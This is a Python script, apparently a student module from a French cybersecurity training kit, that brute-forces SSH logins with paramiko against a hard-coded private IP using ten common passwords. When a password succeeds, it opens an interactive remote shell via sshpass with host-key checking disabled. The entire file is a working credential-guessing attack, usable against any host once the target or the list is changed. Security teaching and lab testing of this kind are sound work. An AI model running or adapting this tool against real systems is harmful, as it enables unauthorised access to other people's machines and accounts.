###############################################################################
# Projet : Mallette de Test de Sécurité Industrielle
# Fichier : Brutforcebdd.py
# Auteur : Maxens DAYDE ESTEVE 
# Version : 1.5
# Date : 2026/04/23
# Formation : BTS CIEL (Cybersécurité, Informatique, Électronique)
# Description : Module pour forcer un mot de passe
###############################################################################

import paramiko
import time
import sys
import os

TARGET_IP = "192.168.0.250"
USERNAME = "admin"
PASSWORDS = ["123456", "password", "admin4", "1234", "qwerty", "root", "admin1", "toto", "security", "admin"]

def brute_force_ssh():
    print(f"\n" + "="*55)
    print(f" 🔥 SSH ATTACK : {USERNAME}@{TARGET_IP}")
    print("="*55)
    
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    found_password = None

    for i, password in enumerate(PASSWORDS, 1):
        status = f"[*] Tentative {i}/{len(PASSWORDS)} : [{password}]"
        sys.stdout.write(f"\r{status.ljust(60)}")
        sys.stdout.flush()
        
        try:
            client.connect(TARGET_IP, username=USERNAME, password=password, timeout=1)
            sys.stdout.write("\r" + " " * 60 + "\r") 
            print(f"[+] SUCCESS: Password found -> {password}")
            found_password = password
            client.close()
            break

        except paramiko.AuthenticationException:
            time.sleep(0.1)
            continue
        except Exception as e:
            print(f"\n[X] Erreur : {e}")
            return

    if found_password:
        print("-" * 55)
        print(f"[!] Ouverture du terminal distant sur {TARGET_IP}...")
        print("-" * 55)
        time.sleep(1)
        
        # Commande pour ouvrir la session SSH interactive directement dans le terminal
        os.system(f"sshpass -p '{found_password}' ssh -o StrictHostKeyChecking=no {USERNAME}@{TARGET_IP}")
    else:
        print("\n\n[-] Aucun mot de passe trouvé.")

if __name__ == "__main__":
    brute_force_ssh()
